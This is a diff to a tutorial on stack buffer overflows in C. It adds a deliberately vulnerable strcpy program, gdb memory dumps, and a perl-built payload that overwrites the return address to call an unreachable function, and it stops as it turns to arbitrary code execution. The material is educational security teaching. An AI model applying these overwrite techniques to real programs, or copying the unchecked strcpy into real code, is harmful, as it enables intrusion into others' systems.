@@ -138,12 +138,34 @@ Let's modify `foo.c` a little to accept user input.
 In this example we're accepting a user-defined string which we will copy into `buffer`. Let's see what this looks like in `gdb`:
 
 ~~~ c
+#include <stdio.h>
+#include <string.h>
+
+int
+myfunc(char* user_input)
+{
+        unsigned int res = 0xDDDDDDDD;
+        char buffer[8];
+        strcpy(buffer, user_input);
+        return res;
+}
+
+int
+main(int argc, char* argv[])
+{
+        unsigned int result = 0xEEEEEEEE;
+        char* user_input = argv[1]; // argv[0] is the program name
+        result = myfunc(user_input);
+        printf("Result: %d\n", result);
+        return 0;
+}
+
 ~~~
 
 
-We're using `U` as user input because `ord('U') = 0x55`, which makes it easy to see (a char is 1 byte so a word will be `0x55555555`).
+We'll be using `U` as user input because `ord('U') = 0x55`, which makes it easy to see (a char is 1 byte so a word will be `0x55555555`).
 
-8 bytes we allocated for `buffer` - but see what happens when you pass in 8 bytes - first *before* `strcpy` and then after.
+8 bytes were allocated for `buffer` - but see what happens when you pass in 8 bytes - first *before* `strcpy` and then after.
 
 ~~~ shell
 vagrant@vagrant:/tmp$ gdb -q ./a.out
@@ -194,6 +216,90 @@ Now let's continue to the next breakpoint, *after* `strcpy`:
 
 We clearly see `0x55555555 0x55555555` representing `UUUUUUUU` but somehow `myres` is no longer what it was.
 
-This is because strings in C are terminated by a null byte (`0x00`) and `strcpy` will keep copying until it finds one. Our buffer is only 8 bytes wide so when we pass in 8 U's, it's actually `0x55555555 0x55555555 0x00` (because we're using little endian, we see this displayed on the right). So by overflowing the buffer, we ended up overwriting a local variable - and if we can overwrite that, could we keep going and overwrite the return address?
+This is because strings in C are terminated by a null byte (`0x00`) and `strcpy` will keep copying until it finds one in the input. Our buffer is only 8 bytes wide so when we pass in 8 U's, it's actually `0x55555555 0x55555555 0x00` (because we're using little endian, we see this displayed on the right). So by overflowing the buffer, we ended up overwriting a local variable - and if we can overwrite that, could we keep going and overwrite the return address?
 
 ## Overwriting the return address
+
+In our previous example the return address was `0x0804848d`. Let's add a function that's not called anywhere:
+
+~~~ c
+void
+hiddenfunc(void)
+{
+  printf("This is unreachable!\n");
+}
+~~~
+
+We can find where that function will be in memory using `objdump`:
+
+~~~ shell
+vagrant@vagrant:/tmp$ objdump -d -M intel -S a.out | grep hiddenfunc
+0804846b <hiddenfunc>:
+hiddenfunc(void)
+~~~
+
+Let's see if we can override `main`'s return address to this one instead. Note it is passed reversed, again due to this being little endian.
+
+~~~ shell
+vagrant@vagrant:/tmp$ gdb -q --args ./a.out $(perl -e 'print "U"x24 . "\x6b\x84\x04\x08"')
+Reading symbols from ./a.out...done.
+(gdb) list
+8       }
+9
+10      int
+11      myfunc(char* user_input)
+12      {
+13        unsigned int res = 0xDDDDDDDD;
+14        char buffer[8];
+15        strcpy(buffer, user_input);
+16        return res;
+17      }
+(gdb) break 15
+Breakpoint 1 at 0x8048491: file foo.c, line 15.
+(gdb) break 16
+Breakpoint 2 at 0x80484a3: file foo.c, line 16.
+(gdb) r
+Starting program: /tmp/a.out UUUUUUUUUUUUUUUUUUUUUUUUk▒
+
+Breakpoint 1, myfunc (user_input=0xffffdd72 'U' <repeats 24 times>, "k\204\004\b") at foo.c:15
+15        strcpy(buffer, user_input);
+(gdb) x/16wx $esp
+0xffffdb40:     0xffffffff      0x0000002f      0xf7e1edc8      0xdddddddd
+0xffffdb50:     0x00008000      0xf7fc2000      0xffffdb88      0x080484d6
+0xffffdb60:     0xffffdd72      0x00000000      0xf7e40830      0x0804854b
+0xffffdb70:     0x00000002      0xffffdc34      0xffffdd72      0xeeeeeeee
+(gdb) c
+Continuing.
+~~~
+
+The memory address we want to override is:
+
+~~~ shell
+(gdb) x/wx 0xffffdb5c
+0xffffdb5c:     0x080484d6
+~~~
+
+Once `strcpy` has been executed, we can indeed see this has been replaced with `0x0804846b`:
+
+~~~ shell
+
+Breakpoint 2, myfunc (user_input=0xffffdd00 "\f") at foo.c:16
+16        return res;
+(gdb) x/16wx $esp
+0xffffdb40:     0xffffffff      0x55555555      0x55555555      0x55555555
+0xffffdb50:     0x55555555      0x55555555      0x55555555      0x0804846b
+0xffffdb60:     0xffffdd00      0x00000000      0xf7e40830      0x0804854b
+0xffffdb70:     0x00000002      0xffffdc34      0xffffdd72      0xeeeeeeee
+(gdb) c
+Continuing.
+This is unreachable!
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffdd00 in ?? ()
+~~~
+
+And sure enough the unreachable function is called.
+
+## Executing user-defined code
+
+That was fun but it's a little limiting - ideally we'd like to execute arbitrary code. That is, point to an area of memory which contains something of ours.
